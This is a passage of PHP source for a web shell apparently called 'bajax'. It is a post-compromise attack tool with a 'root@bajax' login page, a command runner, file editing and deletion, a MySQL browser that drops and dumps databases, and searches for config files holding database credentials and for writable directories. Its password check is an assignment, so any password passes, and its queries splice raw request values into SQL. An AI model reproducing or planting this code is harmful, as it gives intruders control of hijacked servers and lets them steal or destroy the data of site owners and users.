				$_SESSION['pass']=$_POST['pass'];
				$_SESSION['login']=true;
				header("location:?act=view&dir=".$this->dir()."");
			} else {
				header("location:?act=mysql");
			}
		}
		else header("location:?act=view&dir=".$this->dir()."");
	}
	function connector($db=NULL) {
		extract($_SESSION);
		try {
        $this->pdo = new PDO("mysql:host=$host;dbname=$db;port=$port", "$user","$pass" );
        $this->pdo->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );
        }
        catch( PDOException $e ) {
            return "error ". $e->getMessage();
        }
	}
	function pdo_con($host,$port,$user,$pass) {
		try {
        $this->pdo = new PDO("mysql:host=$host;port=$port", "$user","$pass" );
        $this->pdo->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION );
        }
        catch( PDOException $e ) {
            return "error ". $e->getMessage();
        }
	}
	function check() {
		if (strpos($this->connector(), "error")===false) {
			return true;
		} else {
			return false;
		}
	}
	function qe( $sql,$data=null) {
        if ($data!==null) {
        $dat=array_values($data);
        }
        $sel = $this->pdo->prepare( $sql );
        if ($data!==null) {
            $sel->execute($dat);
        } else {
            $sel->execute();
        }
        $sel->setFetchMode( PDO::FETCH_OBJ );
        return $sel;
    }
    function qer2( $sql) {
        $sel = $this->pdo->prepare( $sql );
            $sel->execute();
        $sel->setFetchMode( PDO::FETCH_ASSOC );
        return $sel;
    }
    function qer( $sql) {
        $sel = $this->pdo->prepare( $sql );
        $sel->execute();
        return $sel;
    }
    function insert($table,$dat) {
        if( $dat !== null )
        $data = array_values( $dat );
        $cols=array_keys($dat);
        $col=implode(', ', $cols);
        $mark=array();
        foreach ($data as $key) {
          $keys='?';
          $mark[]=$keys;
        }
        $im=implode(', ', $mark);
        $ins = $this->pdo->prepare("INSERT INTO $table ($col) values ($im)");
        $ins->execute( $data );
    }
    function update($table,$dat,$id,$val) {
        if( $dat !== null )
        $data = array_values( $dat ); 
        array_push($data,$val);
        $cols=array_keys($dat);
        $mark=array();
        foreach ($cols as $col) {
        $mark[]=$col."=?"; 
        }
        $im=implode(', ', $mark);
        $ins = $this->pdo->prepare("UPDATE $table SET $im where $id=?");
        $ins->execute( $data );
    }
    function toArray($d) {
        if (is_object($d)) {
            $d = get_object_vars($d);
        }
        if (is_array($d)) {
            return array_map(array($this,'toArray'), $d);
        }
        else {
          
            return $d;
        }
    }
    function close()
    {
        $r=$this->pdo = null;
    	return $r;
    }
    function logout() {
		extract($_SESSION);
		return "<center>$user@$host <a href='?act=logout'>Logout</a></center>";
	}
    function lihatdb() {
    	$r='';
    	$c=$this->check();
		if($c==true) {
		$r.=$this->logout();
		$r.="<div id='isi'><table width=50% align='center' cellspacing=0  class='xpltab'><tr><th>Database</th><th>Table count</th><th>Size</th><th>Download</th><th>Drop</th></tr>";
		$list=$this->qe("SHOW DATABASES");
		foreach ($list as $isi) {
			$db_size=0;
			$tbl=$this->qe("SHOW TABLES FROM $isi->Database");
			$siz=$this->qe("SHOW TABLE STATUS FROM $isi->Database");
			foreach ($siz as $ni) {
				$db_size += $ni->Data_length+$ni->Index_length;
			}
			$tbl_count=$tbl->rowCount();
			$r.= "<tr><td><a href='?act=showtable&db=$isi->Database'>$isi->Database</td><td>$tbl_count</td><td>".$this->getSize($db_size)."</td><td><a href='?act=downdb&db=$isi->Database'>Full</a> | <a href='?act=downstruc&db=$isi->Database'>Structures</a></td><td><a href='?act=dropdb&db=$isi->Database'>Drop</a></td></tr>";
		}
		$r.= "</table></br><center><form action='?act=mysql' method='post'>New database <input type='text' value='new_db' name='dbname' id='box'><input type='hidden' name='action' value='createdb'><input type='submit' value='create' id='but'></form></center>";
		$r.="</div>";
		}
		else {
			session_destroy();
			$r.="gagal brow";
		}
		$this->close();
		return $r;
	}
	function showtable() {
		$db=$_GET['db'];
		$c=$this->connector($db);
		$r='';
		$r.=$this->logout();
		$r.="<div id='isi'>
		<center><a href='?act=mysql'>Show Database</a></center><br />
		<table width=50% align='center' class='xpltab' cellspacing=0 ><tr><th style='border-left:thin solid #00A600;'>Table Name</th><th>Table Type</th><th>Column count</th><th>Size</th><th>Dump</th><th>Drop</th></tr>";
		$query=$this->qe("SHOW TABLE STATUS");
		foreach ($query as $data) {
			$iml=$this->qe("SHOW COLUMNS FROM $data->Name");
			$name=$data->Name;
			$ni=$data->Data_length+$data->Index_length;
			$h=($iml->rowCount())?$iml->rowCount():0;
			$r.= "<tr><td><a href='?act=showcon&db=$db&table=$name'>$name</td><td>".($data->Comment?$data->Comment:"<font color='#00A600'>TABLE</font>")."</td><td>$h</td><td>".$this->getSize($ni)."</td><td><a href='?act=downdb&db=$db&table=$name'>Dump</a></td><td><a href='?act=dropdb&db=$db&tbl=$name'>Drop</a></td></tr>";
		}
		$r.= "</table></div>";
		return $r;
		$this->close();
	}
	function editrow() {
		$c=$this->connector($_GET['db']);
		$r='';
		$r.=$this->logout();
		$db=$_GET['db'];
		$tbl=$_GET['table'];
		$val=$_GET['val'];
		$col=$_GET['col'];
		$r.="<div id='isi'>
		<center><a href='?act=showtable&db=$db'>Show Tables </a></center><br />";
		$r.="<form method='post' action='?act=showcon&db=$db&table=$tbl&col=$col&val=$val'>";
		$r.="<table width=100% align='center' cellspacing=0 class='xpltab'>";
		$cols=array();
		$iml=$this->qe("SHOW COLUMNS FROM $tbl");
		$query=$this->qer2("SELECT * FROM $tbl WHERE $col='$val'");
		foreach ($iml as $colom) {
			$cols[]=$colom->Field;
		}
		foreach ($query as $data) {
			for($i=0;$i<count($cols);$i++)
			{
				$pt=$cols[$i];
				$r.="<tr><td style='border:none'>".$pt."</td><td style='border:none'>".' : <input id="sqlbox" type="text" name="'.$cols[$i].'" value="'.$data[$pt].'"></td></tr>';

			}
		}
		$r.="</table><input type='hidden' name='action' value='updaterow'><input id='but' type='submit' value='update'></form></div>";
		return $r;
	}
	function updaterow() {
		$this->connector($_GET['db']);
		$db=$_GET['db'];
		$tbl=$_GET['table'];
		$val=$_GET['val'];
		$col=$_GET['col'];
		array_pop($_POST);
		$res=$this->update($tbl,$_POST,$col,$val);
		($res=false?$r.="you can't do that":$r.="Updated");
		$r.=header("location:?act=showcon&db=$db&table=$tbl");
	}
	function showcon() {
		$db=$_GET['db'];
		$c=$this->connector($db);
		$r='';
		$r.=$this->logout();
		$tbl=$_GET['table'];
		$r.="<div id='isi'><center><a href='?act=showtable&db=$db'>Show Tables </a></center><br /><table width=100% align='center' cellspacing=0 class='xpltab'><tr>";
		$query=$this->qe("SELECT * FROM $tbl");
		$col=array();
		$iml=$this->qe("SHOW COLUMNS FROM $tbl");
		$r.="<tr>";
		foreach ($iml as $c) {
			array_push($col,$c->Field);
			$r.="<th style='border:thin solid #000;'>".strtoupper($c->Field)."</th>";
		}
		$r.="<th>Action</th></tr>";
		$row=$query->rowCount();
		$perpage=50;
		$lastpage=ceil($row/$perpage);
		$range=10;
		$page=(isset($_GET['page']))?(int)$_GET['page']:1;
			if ($page<1) {
				$page=1;
			} elseif ($page>$lastpage) {
				$page=$lastpage;
			}
		$offset=($page-1)*$perpage;
		$no=$offset;
		if ($row <=50) {
			$query2=$this->qe("SELECT * FROM $tbl");
		} else {
			$query2=$this->qe("SELECT * FROM $tbl limit $offset,$perpage");
		}
		
		if ($page<6 && $lastpage > $range) {
			$start=1;
		} elseif($page > 5 &&$lastpage >$range) {
			$start=$page-5;
		} else {
			$start=$lastpage-9;
		}

		if ($page > 5 && $lastpage > $range) {
			$end=$page+4;
		} else {
			$end=$range;
		}
		foreach ($query2 as $data) {
			$cols=$iml->rowCount();
			$r.="<tr>";
			foreach ($data as $da) {
				
				if ($da=='') {
					$r.="<td style='border-right:thin solid #00A600;'>&nbsp;</td>";
				} else {
					$r.="<td style='border-right:thin solid #00A600;'>$da</td>";
				}
			}
			$isi=array();
			foreach ($data as $isi_val) {
				$isi[]=$isi_val;
			}
			$r.="<td><a href='?act=editrow&db=$db&table=$tbl&col=$col[0]&val=$isi[0]'>Edit</a> | <a href='?act=delrow&db=$db&table=$tbl&col=$col[0]&val=$isi[0]'>Delete</a>";
			$r.="</td></tr>";
		}
		$r.="</table>";
		if ($row>=50) {
			$r.= "<p><center>page $page of $lastpage";
			$r.= "<a href='?page=".($page-1)."'> Previous </a>";
			for ($i=$start; $i <=$end ; $i++) { 
				if ($i>0 && $i<=$lastpage) {
					if ($page==$i) {
						$r.= "<a style=\"padding:3px;color:#fff\" href='?act=showcon&db=$db&table=$tbl&page=".$i."'>$i </a>";
					}else {
						$r.= "<a style=\"padding:3px;\" href='?act=showcon&db=$db&table=$tbl&page=".$i."'>$i </a>";
					}	
				}
				}
				$r.= "<a href='?page=".($page+1)."'>Next</a></center><br />";
		}
		$r.= "<br /><center><br><a href='?act=insertrow&db=$db&table=$tbl'><input type='button' id='but' value='Insert Row'></a></center></div>";
		return $r;
	}
	function insertrow() {
		$db=$_GET['db'];
		$this->connector($db);
		$db=$_GET['db'];
		$tbl=$_GET['table'];
		$r='';
		if(!isset($_POST['kirim']))
		{
			$r.="<div id='isi'><center><a href='?act=showtable&db=$db'>Show Tables </a></center><br />";
		$r.="<form method='post' action='?act=showcon&db=$db&table=$tbl'>";
		$r.="<table width=100% align='center' cellspacing=0 class='xpltab'>";
		
		$cols=array();
		$iml=$this->qe("SHOW COLUMNS FROM $tbl");
		foreach ($iml as $colom) {
			$cols[]=$colom->Field;
		}
		for($i=0;$i<count($cols);$i++)
		{
			$pt=$cols[$i];
			$r.="<tr><td style='border:none'>".$pt."</td><td style='border:none'>".' : <input id="sqlbox" type="text" name="'.$cols[$i].'"></td></tr>';
		}
		$r.="</table><input type='hidden' name='action' value='insertrow'><input id='but' type='submit' name='kirim' value='Insert'></form></div>";
		return $r;
		} else {
			array_pop($_POST);
			array_pop($_POST);
			$this->insert($tbl,$_POST);
			($qu=false?$r.="Failed brow":$r.="Success");	
			$r.="<script>window.location='?act=showcon&db=$db&table=$tbl';</script>";
		}
		return $r;
	}
	function droprow() {
		$this->connector($_GET['db']);
		$this->qe("DELETE FROM $_GET[table] WHERE $_GET[col]='$_GET[val]'");
		$r.=header("location:?act=showcon&db=$_GET[db]&table=$_GET[table]");
	}
	function createdb($name) {
		$this->connector();
		if(!empty($name))
		{
			$q=$this->qe("CREATE DATABASE $name");
			(!$q?$r.=mysql_error():$r.="Good Brow");
		}
		else $r.="Fill DB Name";
		return $r;
	}
	function dropsql() {
		$this->connector();
		if(!isset($_GET['tbl'])){
			$d=$this->qe("DROP DATABASE $_GET[db]");
			header("location:?act=mysql");
		}
		elseif(isset($_GET['db'])&&isset($_GET['tbl']))
		{
			$this->qe("DROP TABLE $_GET[db].$_GET[tbl]");
			header("location:?act=showtable&db=$_GET[db]");
		}
	}
	function downdb()
	{
		$db=$_GET['db'];
		$c=$this->connector($db);
		$r='';
		if (isset($_GET['db'])&&!isset($_GET['table'])) {
			$r.="--------------------------------\n";
			$r.="-- =========================Bajax Mysql Dumper  =============================\n-- Database : `$db`\n";
			$r.="-------------------------------\n\n";
			$pr=array();
			$fun=array();
			$show_table=$this->qe("SHOW PROCEDURE status where db='test'");
			foreach ($show_table as $key) {
			    if (count($key)>0) {
			        $proc=$this->qer("SHOW CREATE PROCEDURE test.$key->Name");
			        foreach ($proc as $proced) {
			            $pr[]=$proced[2];
			        }
			    }
			}
			$show_table=$this->qe("SHOW FUNCTION status where db='test'");
			foreach ($show_table as $key) {
			    if (count($key)>0) {
			        $proc=$this->qer("SHOW CREATE FUNCTION test.$key->Name");
			        foreach ($proc as $proceds) {
			            $fun[]=$proced[2];
			        }
			    }
			}
			$pro_func='';
			if (count($pr)>0 OR count($fun)>0) {
			    $pro_func.="DELIMITER $$\n\n";
			    if (count($pr)>0) {
			        $pro_func.="--\n";
			        $pro_func.="-- PROCEDURE\n";
			        $pro_func.="--\n";
			        foreach ($pr as $procedure) {
			            $pro_func.=$procedure."$$\n\n";
			        }
			    } 
			    if (count($fun)>0) {
			        $pro_func.="--\n";
			        $pro_func.="-- FUNCTION\n";
			        $pro_func.="--\n";
			        foreach ($fun as $funct) {
			            $pro_func.=$funct."$$\n\n";
			        }
			    }
			    $pro_func.="DELIMITER ;\n\n";
			}
			$r.=$pro_func;

			$table=array();
			$table_name=$this->qe("SHOW TABLE STATUS");
			foreach ($table_name as $d) {
			    $table[]=$d->Name;
			}
			$status=array();
			$stats=$this->qe("SHOW TABLE STATUS");
			   foreach ($stats as $stat) {
			        $stats=array($stat->Name=>"");
			        foreach ($stats as $key => $value) {
			            if ($stat->Engine!=''&&$stat->Auto_increment!='') {
			                $status[]="ENGINE=".$stat->Engine." DEFAULT COLLATE=".$stat->Collation." AUTO_INCREMENT=".$stat->Auto_increment;   
			            }elseif ($stat->Engine!='') {
			                 $status[]="ENGINE=".$stat->Engine." DEFAULT COLLATE=".$stat->Collation;  
			            }else {
			                $status[]='';
			            }
			        }  
			   }
			foreach ($table as $tab) {
			   $cols=$this->qe("SHOW COLUMNS FROM $tab");
			   $inds=$this->qe("SHOW INDEX FROM $tab");
			   $r.= "--\n";
			   $r.= "-- Table structure for table `$tab`\n";
			   $r.= "--\n\n";
			   $r.= "CREATE TABLE IF NOT EXISTS `$tab` (\n";
			   $c='';
			    foreach ($cols as $col) {
			        $c.= "`$col->Field` $col->Type ";
			        if($col->Null=='YES' && $col->Default=='') {
			            $c.= "DEFAULT NULL";
			        }elseif($col->Null=='NO') {
			            $c.= 'NOT NULL';
			        }elseif ($col->Null=='YES'&&$col->Default!='') {
			            $c.= "DEFAULT $col->Default";
			        }
			        if ($col->Extra!='') {
			            $c.= " ".strtoupper($col->Extra);
			        }
			        $c.= ", \n";
			    }
			    $ar=array();
			    foreach ($inds as $key) {
			    $ar[]=$key;
			    }
			    $sr=array();
			    $s=$this->toArray($ar);
			    foreach ($s as $key) {
			         if (strpos($key['Key_name'],"PRIMARY")!==false) {
			                $sr[]= "PRIMARY KEY "."(`$key[Column_name]`)";
			            }elseif (strpos($key['Key_name'], "FK")!==false) {
			               $sr[]="KEY "."`$key[Key_name]` (`$key[Column_name]`)";
			            }
			    }
			    $imp=implode(", \n", $sr);
			    if ($imp=='') {
			        $r.= substr($c, 0,-3)."\n";
			    } else {
			        $r.= $c.$imp."\n";
			    }
			    $r.= ")";
			        foreach ($status as $key => $value) {
			            if ($tab==$key) {
			            $r.= $value.";\n\n";
			        }
			        }
			      $select=$this->qer2("SELECT * FROM $tab");
			       foreach ($select as $data) {
			          if (!empty($data)) {
			          $col=implode(', ',array_keys($data));
			          $val=implode("', '",array_values($data));
			         $r.= "INSERT INTO  `$tab` ($col) VALUES ('$val');\n";
			        }
			      }
			      $r.= "\n";
			    }
			$view=array();
	       $views=$this->qer("SHOW FULL TABLES where Table_type like 'VIEW'");
	      foreach ($views as $ve) {
	          $view[]=$ve;
	      }
	      if (count($view)>0) {
	         foreach ($view as $view_name) {
	             $view_create=$this->qer("SHOW CREATE VIEW $view_name[0]");
	             foreach ($view_create as $create_view) {
	                 echo "DROP TABLE IF EXISTS `$view_name[0]`;\n".$create_view[1].";\n\n";
	             }
	         }
	      }
	      $index2=array();
	      foreach ($table as $tab2) {
	          if (count($tab2)>0) {
	              $find_const=$this->qer("SHOW CREATE TABLE $tab2");
	              foreach ($find_const as $got_const) {
	                  $tmp=strstr($got_const[1], "CONSTRAINT")."\n";
	                    preg_match_all("/(.*)\\n/", $tmp, $match);
	                    if (count($tmp)>0) {
	                       $index2[]="ALTER TABLE `$tab2` ADD ".$match[0][0].";";
	                    }
	              }
	          }
	      }
	      if (count($index2)>0) {
			  foreach ($index2 as $constraint) {
			     if (strpos($constraint, "CONSTRAINT")!==FALSE) {
			    $r.= $constraint."\n";
			  }
			  }
		}
		}
		//downloading database 
		elseif(isset($_GET['db'])&&isset($_GET['table']))
		{
			$r='';
			$tbl=$_GET['table'];
			$r.="-- =========================Bajax Table Dumper  =============================\n-- Database : `$db`\n\n";
			$r.="--\n";
			$r.="--Table or view structure for `$tbl`\n";
			$r.="--\n\n";
			$checks=$this->qer("SHOW CREATE TABLE $tbl");
			      foreach ($checks as $check) {
			        $r.=$check[1]."\n";
			      }
			$checks=$this->qer("SHOW FULL TABLES");
			foreach ($checks as $check_type) {
			  if ($check_type[0]==$tbl&&$check_type[1]=='BASE TABLE') {
			    $select=$db->qer2("SELECT * FROM $tbl");
			             foreach ($select as $data) {
			                if (!empty($data)) {
			                $col=implode(', ',array_keys($data));
			                $val=implode("', '",array_values($data));
			               $r.="INSERT INTO  `$tbl` ($col) VALUES ('$val');\n";
			              }
			            }
			  }
			}
		}
		 else echo "i don't know brow";
		
		(!isset($tbl)?$name="$db.sql":$name="$db.$tbl.sql");
		ob_get_clean();
		header("Content-type:application/octet-stream");
		header("Content-length:".strlen($r));
		header("Content-Disposition:attachment;filename=$name;");
		echo $r;
		exit();
	}
	function downstruc() {
	$db=$_GET['db'];
	$c=$this->connector($db);
	$r='';
	if(isset($_GET['db'])&&!isset($_GET['tbl'])) {	
		
		$r.="--------------------------------\n";
		$r.="-- =========================Bajax Mysql Dumper Structures  =============================\n-- Database : `$db`\n";
		$r.="-------------------------------\n\n";
		$pr=array();
		$fun=array();
		$show_table=$this->qe("SHOW PROCEDURE status where db='test'");
		foreach ($show_table as $key) {
		    if (count($key)>0) {
		        $proc=$this->qer("SHOW CREATE PROCEDURE test.$key->Name");
		        foreach ($proc as $proced) {
		            $pr[]=$proced[2];
		        }
		    }
		}
		$show_table=$this->qe("SHOW FUNCTION status where db='test'");
		foreach ($show_table as $key) {
		    if (count($key)>0) {
		        $proc=$this->qer("SHOW CREATE FUNCTION test.$key->Name");
		        foreach ($proc as $proceds) {
		            $fun[]=$proced[2];
		        }
		    }
		}
		$pro_func='';
		if (count($pr)>0 OR count($fun)>0) {
		    $pro_func.="DELIMITER $$\n\n";
		    if (count($pr)>0) {
		        $pro_func.="--\n";
		        $pro_func.="-- PROCEDURE\n";
		        $pro_func.="--\n";
		        foreach ($pr as $procedure) {
		            $pro_func.=$procedure."$$\n\n";
		        }
		    } 
		    if (count($fun)>0) {
		        $pro_func.="--\n";
		        $pro_func.="-- FUNCTION\n";
		        $pro_func.="--\n";
		        foreach ($fun as $funct) {
		            $pro_func.=$funct."$$\n\n";
		        }
		    }
		    $pro_func.="DELIMITER ;\n\n";
		}
		$r.=$pro_func;

		$table=array();
		$table_name=$this->qe("SHOW TABLE STATUS");
		foreach ($table_name as $d) {
		    $table[]=$d->Name;
		}
		$status=array();
		$stats=$this->qe("SHOW TABLE STATUS");
		   foreach ($stats as $stat) {
		        $stats=array($stat->Name=>"");
		        foreach ($stats as $key => $value) {
		            if ($stat->Engine!=''&&$stat->Auto_increment!='') {
		                $status[]="ENGINE=".$stat->Engine." DEFAULT COLLATE=".$stat->Collation." AUTO_INCREMENT=".$stat->Auto_increment;   
		            }elseif ($stat->Engine!='') {
		                 $status[]="ENGINE=".$stat->Engine." DEFAULT COLLATE=".$stat->Collation;  
		            }else {
		                $status[]='';
		            }
		        }  
		   }
		foreach ($table as $tab) {
		   $cols=$this->qe("SHOW COLUMNS FROM $tab");
		   $inds=$this->qe("SHOW INDEX FROM $tab");
		   $r.= "--\n";
		   $r.= "-- Table structure for table `$tab`\n";
		   $r.= "--\n\n";
		   $r.= "CREATE TABLE IF NOT EXISTS `$tab` (\n";
		   $c='';
		    foreach ($cols as $col) {
		        $c.= "`$col->Field` $col->Type ";
		        if($col->Null=='YES' && $col->Default=='') {
		            $c.= "DEFAULT NULL";
		        }elseif($col->Null=='NO') {
		            $c.= 'NOT NULL';
		        }elseif ($col->Null=='YES'&&$col->Default!='') {
		            $c.= "DEFAULT $col->Default";
		        }
		        if ($col->Extra!='') {
		            $c.= " ".strtoupper($col->Extra);
		        }
		        $c.= ", \n";
		    }
		    $ar=array();
		    foreach ($inds as $key) {
		    $ar[]=$key;
		    }
		    $sr=array();
		    $s=$this->toArray($ar);
		    foreach ($s as $key) {
		         if (strpos($key['Key_name'],"PRIMARY")!==false) {
		                $sr[]= "PRIMARY KEY "."(`$key[Column_name]`)";
		            }elseif (strpos($key['Key_name'], "FK")!==false) {
		               $sr[]="KEY "."`$key[Key_name]` (`$key[Column_name]`)";
		            }
		    }
		    $imp=implode(", \n", $sr);
		    if ($imp=='') {
		        $r.= substr($c, 0,-3)."\n";
		    } else {
		        $r.= $c.$imp."\n";
		    }
		    $r.= ")";
		        foreach ($status as $key => $value) {
		            if ($tab==$key) {
		            $r.= $value.";\n\n";
		        }
		        }
		      $r.= "\n";
		    }
		$view=array();
       $views=$this->qer("SHOW FULL TABLES where Table_type like 'VIEW'");
      foreach ($views as $ve) {
          $view[]=$ve;
      }
      if (count($view)>0) {
         foreach ($view as $view_name) {
             $view_create=$this->qer("SHOW CREATE VIEW $view_name[0]");
             foreach ($view_create as $create_view) {
                 echo "DROP TABLE IF EXISTS `$view_name[0]`;\n".$create_view[1].";\n\n";
             }
         }
      }
      $index2=array();
      foreach ($table as $tab2) {
          if (count($tab2)>0) {
              $find_const=$this->qer("SHOW CREATE TABLE $tab2");
              foreach ($find_const as $got_const) {
                  $tmp=strstr($got_const[1], "CONSTRAINT")."\n";
                    preg_match_all("/(.*)\\n/", $tmp, $match);
                    if (count($tmp)>0) {
                       $index2[]="ALTER TABLE `$tab2` ADD ".$match[0][0].";";
                    }
              }
          }
      }
      if (count($index2)>0) {
		  foreach ($index2 as $constraint) {
		     if (strpos($constraint, "CONSTRAINT")!==FALSE) {
		    $r.= $constraint."\n";
		  }
		  }
	}
		$name="$db.sql";
		ob_get_clean();
		header("Content-type:application/octet-stream");
		header("Content-length:".strlen($r));
		header("Content-Disposition:attachment;filename=$name;");
		echo $r;
		exit();
	}
	}
	function locate() {
		$r="<div id='isi'>";
		if (isset($_POST['cari'])) {
			$r.="<table width='100%'' class='xpltab'><tr><th>These Files Probably config File</th></tr>";
			$r.=$this->loc($_POST['addr']);
			$r.="</table>";
		}else {
			$r="<center><form method='post' action='?act=loc&dir=".$this->dir()."'>Find config file<p /><input type='hidden' style='width:500px;' name='addr' id='box' value='".$this->dir()."'>".$this->current('loc')."<p /><input type='submit' name='cari' id='but' value='Search'></form></center>";
		}
		$r.="</div>";	
			return $r;
	}
	function loc($dir) {
		$r='';
		if($files = @scandir($dir)) {
			foreach($files as $file) {
				if($file != '.' && $file != '..') {
				if(@is_dir($dir."\\".$file)) {
					$r.=$this->loc($dir.$file.DIRECTORY_SEPARATOR);
				} else {
					$sp = @file_get_contents($dir.DIRECTORY_SEPARATOR.$file);
					if($sp)
						
							if((stripos($sp, "\"localhost\""))|| (stripos($sp,'localhost'))) {
							   $r.="<tr><td> <a href='?act=lihat&dir=".$this->dir()."&file=".$dir.$file."'>$dir$file</a></td></tr>";
							}
				}
			}
		}
		}
		return $r;
	}
	function locate_file($dir,$name) {
		$res=array();
		foreach (scandir($dir) as $file) {
			if ($file !='.' && $file !='..') {
				if (is_dir($dir.DIRECTORY_SEPARATOR.$file)) {
					$res=array_merge($res,$this->locate_file($dir.DIRECTORY_SEPARATOR.$file,$name));
					if (is_dir($dir.DIRECTORY_SEPARATOR.$file) && preg_match('/^'.$name.'/',$file )) {
						$res[]=$dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR;
					}
				} else {
					
					if (preg_match("/^$name/", $file)) {
						$res[]=$dir.DIRECTORY_SEPARATOR.$file;
					}
					
				}
			}
		}
		return $res;
	}

	function scdir($dir) {
		$res=array();
		foreach (scandir($dir) as $file) {
			if ($file !='.' && $file !='..') {
				if (is_dir($dir.DIRECTORY_SEPARATOR.$file)) {
					$res=array_merge($res,$this->scdir($dir.DIRECTORY_SEPARATOR.$file));
					if (is_dir($dir.DIRECTORY_SEPARATOR.$file) && is_writable($dir.DIRECTORY_SEPARATOR.$file)) {
						$res[]=$dir.DIRECTORY_SEPARATOR.$file.DIRECTORY_SEPARATOR;
					}
				}
			}
		}
		return $res;
	}
	function writable()
	{
		$r="<div id='isi'>";
		if(isset($_POST['finddir'])&&isset($_POST['submit']))
		{
			$search=$this->scdir($_POST['finddir']);
			if (count($search)>0) {
				$r.="<table width='100%'' class='xpltab'><tr><th>Writable dir Found</th></tr>";
				foreach ($search as $file) {
					if (is_dir($file)) {
						$r.="<tr><td><a href='?act=file&dir=".$file."'>$file</a></td></tr>";
					} else {
						$r.="<tr><td><a href='?act=lihat&dir=".$this->dir()."&file=$file'>$file</a></td></tr>";
					}
			
		}
			} else {
				$r.="<table width='100%'' class='xpltab'><tr><th>Sorry, No writable dir found</th></tr>";
			}
		
		$r.="</table>";
			
		} else {
			$r.="<center>Find All Writable Directory <br /><form method='post' action='?act=write&dir=".$this->dir()."'>".$this->current('write')."<br /><input type='hidden' name='finddir' id='box' value='".$this->dir()."'><input id='but' type='submit' style='margin-top:5px;color:#fff'  name='submit' value='Search'></center><form>";
			}
		$r.="</div>";
		return $r;
	}
	function search() {
		$r="<div id='isi'>";
		if (isset($_POST['cari']) && $_POST['filename']) {
			$search=$this->locate_file($_POST['addr'],$_POST['filename']);
				if (count($search)>0) {
					$r.="<table width='100%'' class='xpltab'><tr><th>Files Found</th></tr>";
					foreach ($search as $file) {
						if (is_dir($file)) {
							$r.="<tr><td><a href='?act=file&dir=".$file."'>$file</a></td></tr>";
						} else {
							$r.="<tr><td><a href='?act=lihat&dir=".$this->dir()."&file=$file'>$file</a></td></tr>";
						}
			}
				} else {
					$r.="<table width='100%'' class='xpltab'><tr><th>Sorry, No file found</th></tr>";
				}
			$r.="</table>";
		} else {
			$r="<center><form method='post' action='?act=search&dir=".$this->dir()."'>Search File<p />
			<input type='hidden' style='width:500px;' name='addr' id='box' value='".$this->dir()."'>".$this->current('search')."<p />
			<input type='text' name='filename' id='box'>
		<input type='submit' name='cari' id='but' value='Search'></form></center>";
		}
		$r.="</div>";	
		return $r;
	}
	function bdf($dir) {
		$r='';
		$has=$_POST['bug'];
		if($files = @scandir($dir)) {
			foreach($files as $file) {
				if($file != '.' && $file != '..'&& $file !='cgi-bin') {
				if(@is_dir($dir.$slash.$file)) {
					$r.=$this->bdf($dir.$file.DIRECTORY_SEPARATOR);
				   
				} else {
					$op = @file_get_contents($dir.DIRECTORY_SEPARATOR.$file);
					if($op)
						foreach($has as $bug) {
							if(@preg_match("/$bug\((.*?)\)/", $op)) {
								
							   $r.="<tr><td>Contain '$bug' at <a href='?act=lihat&dir=".$this->dir()."&file=".$dir.$file."'>$dir.$file</a></td><td>".date("d-M-Y H:i",filemtime($dir.$file))."</td></tr>";
								
							} 
						}
						
				}
			}
		}
		}
		return $r;
	}
	function doorscan() {
		$this->find = array('base64_decode','system','passthru','popen','exec','shell_exec','eval','move_uploaded_file','copy','pcntl_exec','escapeshellarg','escapeshellcmd','proc_open','proc_get_status','proc_nice','proc_open','proc_terminate');
		$r="<div id='isi'>";
		if(isset($_POST['submit'])&&isset($_POST['bug']))
		{	$r.="<table width='100%'' class='xpltab'><tr><th>These Files Probably Backdoor</th><th>Last Modified</th></tr>";
			$r.=$this->bdf($_POST['dir']);
			$r.="</table>";
		}
		else {
			$r.="<center><form method='post' action='?act=bds&dir=".$this->dir()."'>Scan In : <input type='hidden' name='dir' value='".$this->dir()."'>".$this->current('bds')."<br />Scan Type : </center>";
			foreach ($this->find as $val) {
				$r.="<input style='margin-left:43%;margin-top:7px;' type='checkbox' name='bug[]' value='".$val."'>".$val."<br />";
			}
			$r.="<center><input type='submit' name='submit' id='but' style='margin-top:10px;width:150px;color:#fff' value='Search Backdoor'></form>";
			$r.="</center>";
		}
		$r.="</div>";
		return $r;
	}
    function auth() {
		$res='<style>body{background:#000;}input {background:#120f0b;border:none;color:#00A600;}</style><div style="font-size:12px;color:#00A600;position:fixed;top:10px;left:50%;margin-left:-150px;padding:10px 50px 50px 10px;background:#120f0b;border-top:20px solid #00A600;-moz-box-shadow:inset 0 0 10px #00c6ff;
		-webkit-box-shadow: inset 0 0 10px #00c6ff;
		box-shadow: 0 0 10px #00A600;
		border-radius:5px"><form method="post" action="">
		<input value="root@bajax:-$" disabled="disabled"><br>Password :
		<input  type="password" autofocus="autofocus" name="pass" >
		<input type="submit" style="color:#120f0b;width:0" name="auth">
		</form></div>';
		return $res;
	}
	function cookies() {			
		if(isset($_POST['auth'])) {
		$pass=strtolower(trim(md5($_POST['pass'])));
		if($this->password=$pass) {
			setcookie('bajax',$pass,time()+3600*24);
			$url=$_SERVER['SCRIPT_NAME'];
			header('location:'.$url);
			die();
		}
		}
		if(empty($_COOKIE['bajax']) and $_COOKIE['bajax'] !=$this->password) {
			echo $this->auth();
			die();
		}

	}

}
$bajax=new bajax();
$r='';
$r.=$bajax->header();
$r.=$bajax->menu();
$r.="</div='isi'>";
switch ($_GET['act']) {
	case 'file':
	if(isset($_GET['act2'])=='del')
	$r.=$bajax->remfile();
	if(isset($_GET['act3'])=='del')
	$r.=$bajax->remdir();
	$r.=$bajax->xpl();	
	$r.=$bajax->center();
	break;
	case 'edit':
	$r.=$bajax->edit($_GET['file']);
	break;
	case 'ren':
	$r.=$bajax->ren($_GET['file']);
	break;
	case 'cmd':
	$r.=$bajax->command();
	$r.=$bajax->center();
	break;
	case 'downfile':
	$r.=$bajax->downloadfile($_GET['file']);
		break;
	case 'down':
	$r.=$bajax->get_selected($_GET['file']);
	break;
	case 'downfolder':
	$r.=$bajax->downloadfolder($_GET['file']);
	break;
	case 'mysql':
	$r.=$bajax->login();
	break;
	case 'view':
	$r.=$bajax->lihatdb();
	break;
	case 'showtable':
	$r.=$bajax->showtable();
	break;
	case 'showcon':
	$r.=$bajax->showcon();
	break;
	case 'downdb':
	$r.=$bajax->downdb();
	break;
	case 'downstruc':
	$r.=$bajax->downstruc();
	break;
	case 'editrow':
	$r.=$bajax->editrow();
	break;
	case 'logout':
	$_SESSION=array();
